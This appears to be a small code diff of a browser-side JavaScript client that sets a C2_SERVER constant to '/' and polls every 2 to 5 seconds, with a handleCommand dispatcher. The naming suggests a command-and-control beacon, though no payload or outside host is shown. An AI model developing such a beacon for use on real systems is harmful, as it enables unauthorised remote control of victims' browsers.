@@ -28,7 +28,7 @@ window.run = function(cfg) {
     });
 };
 
-  const C2_SERVER = ''; // Update if needed
+  const C2_SERVER = '/'; // Update if needed
   const MIN_POLL_SECONDS = 2;
   const MAX_POLL_SECONDS = 5;
 
@@ -261,4 +261,5 @@ async function handleCommand(command) {
       console.warn('[Unknown Command]', command.type);
   }
 }
+
 
